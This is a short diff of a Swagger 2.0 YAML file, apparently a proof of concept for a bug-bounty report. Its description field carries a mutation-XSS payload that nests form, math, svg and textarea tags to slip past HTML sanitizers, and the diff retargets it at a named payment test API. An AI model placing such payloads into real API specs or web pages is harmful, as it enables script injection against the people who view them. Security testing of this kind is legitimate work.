@@ -1,12 +1,12 @@
 ---
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: Exploited Swagger 2.0 (TBCPAY)
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onclick=(alert("zdarovaaaaa") src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><a onclick=(alert("zdarovaaaaa")>Click Me!</a>"></form>
 
   version: production
-basePath: https://target.com
+basePath: https://testapi.tbcpay.com
 produces:
 - application/xml
 - application/json
